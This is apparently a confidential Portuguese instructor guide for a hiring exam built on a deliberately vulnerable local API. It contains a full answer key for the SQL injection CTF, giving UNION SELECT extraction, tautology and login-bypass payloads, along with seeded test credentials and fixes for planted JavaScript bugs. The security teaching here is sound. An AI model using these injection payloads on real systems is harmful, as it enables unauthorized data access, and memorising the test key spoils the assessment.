# 📋 Guia do Instrutor

> Documento confidencial para instrutores da prova prática

---

## 🎯 Objetivos de Aprendizado

### Parte 1: Exploração com Postman
- Familiarização com APIs REST
- Entendimento de métodos HTTP (GET, POST, PUT, DELETE, PATCH)
- Uso de query params e body
- Interpretação de respostas JSON

### Parte 2: CTF - SQL Injection
- Compreensão de vulnerabilidades de segurança
- Importância de prepared statements
- Técnicas básicas de SQL Injection
- Conscientização sobre segurança

### Parte 3: Correção de Bugs
- Leitura e compreensão de código
- Debugging básico
- Conceitos de JavaScript: tipos, async/await, escopo
- Boas práticas de programação

---

## ⏱️ Sugestão de Tempo

| Parte | Duração Sugerida |
|-------|------------------|
| Parte 1: Exploração | 30-45 minutos |
| Parte 2: CTF | 60-90 minutos |
| Parte 3: Bugs | 45-60 minutos |
| **Total** | **2.5-3.5 horas** |

---

## 📊 Dados do Banco

O banco foi populado com dados realistas:

| Tabela | Quantidade | Descrição |
|--------|------------|-----------|
| categories | 10 | Categorias de produtos |
| products | 108 | Produtos variados |
| users | 27 | Usuários diversos (admins, gerentes, baristas, clientes) |
| orders | 25 | Pedidos com histórico |
| order_items | ~40 | Itens dos pedidos |
| promotions | 9 | Códigos promocionais |
| audit_logs | 9 | Logs de auditoria |
| secret_flags | 10 | Flags do CTF |
| admin_notes | 5 | Notas confidenciais |

### Usuários de Teste

| Username | Senha | Cargo | Observação |
|----------|-------|-------|------------|
| admin | admin123 | admin | Conta principal |
| cto_rafael | r4f43l_s3cr3t | admin | Tem flag nas notes |
| gerente_maria | maria2024! | manager | |
| barista_joao | cafezinho | barista | |
| cliente_carlos | carlos99 | user | Cliente VIP |
| suporte_tech | Flag{SQL_1nj3ct10n_M4st3r} | admin | INATIVO - Flag na senha! |
| root | Flag{H0n3yp0t_D3t3ct3d} | admin | INATIVO - Honeypot |

---

## 🔧 Preparação do Ambiente

### Antes da Prova

1. **Teste o ambiente**
```bash
docker-compose up --build
# Aguarde ~30 segundos
curl http://localhost:3000
```

2. **Verifique se todos os endpoints funcionam**
```bash
# Produtos
curl http://localhost:3000/api/products

# Vulnerável
curl "http://localhost:3000/api/vulnerable/search?q=café"

# Buggy
curl http://localhost:3000/api/buggy
```

3. **Prepare as estações dos candidatos**
   - Docker instalado e funcionando
   - Postman instalado
   - Editor de código (VS Code recomendado)
   - Terminal disponível

### Durante a Prova

1. **Monitore os logs do container**
```bash
docker-compose logs -f api
```

2. **Observe as queries SQL Injection**
```bash
# As queries vulneráveis são logadas com [VULNERABLE]
```

### Após a Prova

1. **Reset do banco** (entre candidatos se necessário)
```bash
docker-compose down -v
docker-compose up --build
```

---

## 📊 Critérios de Avaliação

### Parte 1: Exploração (0-30 pontos)

| Critério | Pontos |
|----------|--------|
| Conseguiu fazer requisições GET | 5 |
| Conseguiu fazer requisições POST | 5 |
| Usou query params corretamente | 5 |
| Interpretou respostas de erro | 5 |
| Conseguiu criar um pedido | 5 |
| Documentou os testes realizados | 5 |

### Parte 2: CTF (0-520 pontos)

| Flag | Pontos | Dificuldade | Técnica |
|------|--------|-------------|---------|
| Flag{W3lc0m3_t0_SQL_W0rld} | 10 | 🟢 Iniciante | UNION SELECT básico |
| Flag{SQL_1nj3ct10n_M4st3r} | 25 | 🟢 Fácil | Ver usuários inativos |
| Flag{Pr0m0_C0d3_Hunt3r} | 30 | 🟢 Fácil | SQLi em promoções |
| Flag{Pr0duct_Hunt3r_Pr0} | 40 | 🟡 Fácil | Buscar produto especial |
| Flag{Un10n_S3l3ct_Pr0} | 50 | 🟡 Médio | UNION SELECT avançado |
| Flag{H0n3yp0t_D3t3ct3d} | 50 | 🟡 Médio | Login como root |
| Flag{1nf0rm4t10n_Sch3m4} | 60 | 🟡 Médio | Explorar information_schema |
| Flag{4dm1n_4cc3ss_Gr4nt3d} | 75 | 🟠 Médio | Notas do CTO |
| Flag{4dm1n_N0t3s_F0und} | 80 | 🟠 Médio-Difícil | Tabela admin_notes |
| Flag{4dm1n_P4ssw0rd_L34k3d} | 100 | 🔴 Difícil | Bypass autenticação |

### Parte 3: Bugs (0-60 pontos)

| Bug | Pontos | Conceito |
|-----|--------|----------|
| #1 Comparação | 10 | Tipos em JS |
| #2 Cálculo | 10 | Coerção de tipos |
| #3 Async | 10 | Promises/async |
| #4 Off-by-One | 10 | Loops e arrays |
| #5 Validação | 10 | Input validation |
| #6 Escopo | 10 | var vs let/const |

### Pontuação Total: 610 pontos

---

## ✅ Gabarito Completo - CTF

### Flag 1 (10 pts) - `Flag{W3lc0m3_t0_SQL_W0rld}`

**Endpoint:** GET `/api/vulnerable/search`

**Payload:**
```
?q=' UNION SELECT flag_code,flag_name,hint,points,5,6,7,8,9 FROM secret_flags --
```

**Explicação:**
1. A query original tem 9 colunas
2. Fechamos a string com `'`
3. Usamos UNION para combinar com secret_flags
4. `--` comenta o resto da query

---

### Flag 2 (25 pts) - `Flag{SQL_1nj3ct10n_M4st3r}`

**Endpoint:** GET `/api/vulnerable/users`

**Payload:**
```
?role=' OR '1'='1
```

**Ou para ver apenas inativos:**
```
?role=' OR active=0 --
```

**Explicação:**
1. Retorna TODOS os usuários
2. O usuário `suporte_tech` tem a flag como senha
3. Está marcado como `active=FALSE`

---

### Flag 3 (30 pts) - `Flag{Pr0m0_C0d3_Hunt3r}`

**Endpoint:** GET `/api/vulnerable/promo`

**Payload:**
```
?code=' OR '1'='1
```

**Explicação:**
1. Retorna todas as promoções
2. Existe um código `FLAG99` com a flag no nome
3. Está marcado como `active=FALSE`

---

### Flag 4 (40 pts) - `Flag{Pr0duct_Hunt3r_Pr0}`

**Endpoint:** GET `/api/vulnerable/search` ou `/api/products`

**Payload:**
```
?q=Flag
```

**Ou:**
```
?q=999
```

**Explicação:**
1. Há um produto chamado "Flag Coffee Special"
2. Preço de R$ 999,99 (suspeito!)
3. Está na categoria "Temporários"
4. A flag está na descrição do produto

---

### Flag 5 (50 pts) - `Flag{Un10n_S3l3ct_Pr0}`

**Endpoint:** GET `/api/vulnerable/product/:id`

**Payload:**
```
/api/vulnerable/product/0 UNION SELECT 1,flag_code,flag_name,hint,points,6,7,8,9,10,11,12,13,14,15 FROM secret_flags WHERE flag_name='UNION Expert'
```

**Explicação:**
1. A query tem 15 colunas
2. ID 0 não existe, então só retorna o UNION
3. Precisa mapear as colunas corretamente

---

### Flag 6 (50 pts) - `Flag{H0n3yp0t_D3t3ct3d}`

**Endpoint:** POST `/api/vulnerable/login`

**Payload:**
```json
{
    "username": "root' --",
    "password": ""
}
```

**Ou:**
```json
{
    "username": "root",
    "password": "Flag{H0n3yp0t_D3t3ct3d}"
}
```

**Explicação:**
1. A conta `root` é um honeypot (armadilha)
2. A senha É a própria flag
3. O sistema detecta e avisa que é um honeypot

---

### Flag 7 (60 pts) - `Flag{1nf0rm4t10n_Sch3m4}`

**Endpoint:** GET `/api/vulnerable/tables`

**Payload:**
```
?schema=grao_codigo
```

**Explicação:**
1. Retorna todas as tabelas do banco
2. A flag é concedida por descobrir `secret_flags` e `admin_notes`
3. Usar information_schema é técnica fundamental

---

### Flag 8 (75 pts) - `Flag{4dm1n_4cc3ss_Gr4nt3d}`

**Endpoint:** GET `/api/vulnerable/users`

**Payload:**
```
?role=' OR username='cto_rafael
```

**Ou ver todos com:**
```
?role=' OR '1'='1
```

**Explicação:**
1. O CTO `cto_rafael` tem a flag no campo `notes`
2. Precisa ver todos os usuários para encontrar

---

### Flag 9 (80 pts) - `Flag{4dm1n_N0t3s_F0und}`

**Endpoint:** GET `/api/vulnerable/notes`

**Payload:**
```
?priority=' OR '1'='1
```

**Ou específico:**
```
?priority=critical
```

**Explicação:**
1. A tabela `admin_notes` é "escondida"
2. Há uma nota com título "Senhas do Sistema"
3. O conteúdo contém a flag

---

### Flag 10 (100 pts) - `Flag{4dm1n_P4ssw0rd_L34k3d}`

**Endpoint:** POST `/api/vulnerable/login`

**Payload:**
```json
{
    "username": "admin' --",
    "password": "qualquer"
}
```

**Alternativas:**
```json
{
    "username": "' OR role='admin' AND active=1 --",
    "password": ""
}
```

```json
{
    "username": "admin'/*",
    "password": "*/--"
}
```

**Explicação:**
1. O `--` comenta a verificação de senha
2. Precisa ser admin ATIVO (não pode ser suporte_tech ou root)
3. A query fica: `WHERE username = 'admin' --' AND password = '...'`

---

## ✅ Gabarito Completo - Bugs

### Bug #1 - Comparação de Tipos

**Arquivo:** `src/routes/buggy.js` linha ~35

**Problema:**
```javascript
const inStock = product.stock == '0' ? false : true;
```

**Solução:**
```javascript
const inStock = product.stock > 0;
// ou
const inStock = product.stock !== 0;
```

**Explicação:**
- `stock` é número, `'0'` é string
- A comparação `==` faz coerção de tipos
- Melhor usar comparação numérica explícita

---

### Bug #2 - Cálculo Incorreto

**Arquivo:** `src/routes/buggy.js` linha ~65

**Problema:**
```javascript
let total = '0'; // String!
total += subtotal; // Concatenação!
```

**Solução:**
```javascript
let total = 0; // Número
total += subtotal; // Soma correta
```

**Explicação:**
- `'0' + 15.00 = '015'` (concatenação)
- Variáveis numéricas devem ser inicializadas com números

---

### Bug #3 - Async/Await

**Arquivo:** `src/routes/buggy.js` linha ~95

**Problema:**
```javascript
items.forEach(async (item) => {
    // async dentro de forEach não espera!
});
// Código continua ANTES do forEach terminar
```

**Solução:**
```javascript
for (const item of items) {
    const [product] = await query(...);
    // ... resto do código
}
// Agora espera cada item
```

**Ou usando Promise.all:**
```javascript
await Promise.all(items.map(async (item) => {
    // ... código async
}));
```

**Explicação:**
- `forEach` não retorna Promise
- `for...of` com await espera cada iteração

---

### Bug #4 - Off-by-One Error

**Arquivo:** `src/routes/buggy.js` linha ~140

**Problema:**
```javascript
for (let i = 1; i <= products.length; i++) {
    ranking.push({ product: products[i] });
}
```

**Solução:**
```javascript
for (let i = 0; i < products.length; i++) {
    ranking.push({
        position: i + 1,
        product: products[i]
    });
}
```

**Explicação:**
- Arrays são 0-indexed
- `products[products.length]` é `undefined`
- Use `<` ao invés de `<=`

---

### Bug #5 - Validação de Entrada

**Arquivo:** `src/routes/buggy.js` linha ~175

**Problema:**
```javascript
// Sem validação!
const discountedPrice = product.price * (1 - discount_percent / 100);
```

**Solução:**
```javascript
if (typeof discount_percent !== 'number' || 
    isNaN(discount_percent) ||
    discount_percent < 0 || 
    discount_percent > 100) {
    return res.status(400).json({
        success: false,
        error: 'Desconto deve ser um número entre 0 e 100'
    });
}

const discountedPrice = product.price * (1 - discount_percent / 100);
```

**Explicação:**
- Valores negativos aumentam o preço
- Valores > 100 resultam em preço negativo
- Sempre validar entrada do usuário

---

### Bug #6 - Escopo de Variável

**Arquivo:** `src/routes/buggy.js` linha ~210

**Problema:**
```javascript
var categoryTotal = 0; // Fora do loop, escopo de função

for (const category of categories) {
    categoryTotal += parseFloat(result.total);
    summary.push({ total_sales: categoryTotal }); // Acumula!
}
```

**Solução:**
```javascript
for (const category of categories) {
    const categoryTotal = parseFloat(result.total); // Dentro do loop!
    summary.push({ total_sales: categoryTotal });
}
```

**Explicação:**
- `var` tem escopo de função, não de bloco
- Usar `const`/`let` dentro do loop cria nova variável

---

## 💡 Dicas para Condução

### Para Iniciantes em SQL Injection

Se o candidato está travado no CTF:

1. **Dica nível 1:** "Tente colocar uma aspas simples no campo"
2. **Dica nível 2:** "O erro SQL te mostra a estrutura da query"
3. **Dica nível 3:** "Pesquise sobre SQL Injection UNION SELECT"
4. **Dica nível 4:** "Acesse /api/vulnerable/flags para ver dicas"

### Para Dificuldade com Bugs

1. **Dica geral:** "Execute a rota e observe o resultado incorreto"
2. **Dica específica:** "Compare o tipo esperado com o tipo real"
3. **Dica avançada:** "Use console.log para debug"

---

## 📝 Template de Avaliação

```
Candidato: _______________
Data: _______________

PARTE 1 - EXPLORAÇÃO (30 pts)
[ ] GET básico (5 pts)
[ ] POST (5 pts)  
[ ] Query params (5 pts)
[ ] Erros (5 pts)
[ ] Criar pedido (5 pts)
[ ] Documentação (5 pts)
Subtotal: ___ / 30

PARTE 2 - CTF (520 pts)
[ ] Flag 1 - Welcome (10 pts)
[ ] Flag 2 - SQL Master (25 pts)
[ ] Flag 3 - Promo Hunter (30 pts)
[ ] Flag 4 - Product Hunter (40 pts)
[ ] Flag 5 - Union Pro (50 pts)
[ ] Flag 6 - Honeypot (50 pts)
[ ] Flag 7 - Schema (60 pts)
[ ] Flag 8 - CTO Notes (75 pts)
[ ] Flag 9 - Admin Notes (80 pts)
[ ] Flag 10 - Admin Access (100 pts)
Subtotal: ___ / 520

PARTE 3 - BUGS (60 pts)
[ ] Bug 1 - Comparação (10 pts)
[ ] Bug 2 - Cálculo (10 pts)
[ ] Bug 3 - Async (10 pts)
[ ] Bug 4 - Off-by-One (10 pts)
[ ] Bug 5 - Validação (10 pts)
[ ] Bug 6 - Escopo (10 pts)
Subtotal: ___ / 60

TOTAL: ___ / 610

Nível de Classificação:
[ ] Expert (500+)
[ ] Avançado (350-499)
[ ] Intermediário (200-349)
[ ] Iniciante (100-199)
[ ] Precisa desenvolver (<100)

Observações:
_______________________
_______________________
```

---

## 🆘 Troubleshooting

### Container não inicia
```bash
docker-compose down -v
docker system prune -f
docker-compose up --build
```

### MySQL não conecta
- Aguarde mais tempo (pode demorar 30-60s)
- Verifique logs: `docker-compose logs mysql`

### Hot reload não funciona
- Verifique se o volume está mapeado
- Reinicie o container: `docker-compose restart api`

### Porta 3000 em uso
```bash
lsof -i :3000
kill -9 <PID>
```

### Reset completo
```bash
docker-compose down -v --remove-orphans
docker volume prune -f
docker-compose up --build
```

---

## 🔍 Queries Úteis para Verificação

```sql
-- Ver flags encontradas
SELECT * FROM secret_flags WHERE found_by IS NOT NULL;

-- Ver usuários com flags
SELECT username, password, notes FROM users 
WHERE password LIKE '%Flag{%' OR notes LIKE '%Flag{%';

-- Produtos especiais
SELECT name, price, description FROM products 
WHERE description LIKE '%Flag{%';

-- Promoções com flag
SELECT * FROM promotions WHERE name LIKE '%Flag{%';

-- Notas do admin
SELECT * FROM admin_notes WHERE content LIKE '%Flag{%';
```

---

*Documento confidencial - Não compartilhar com candidatos*
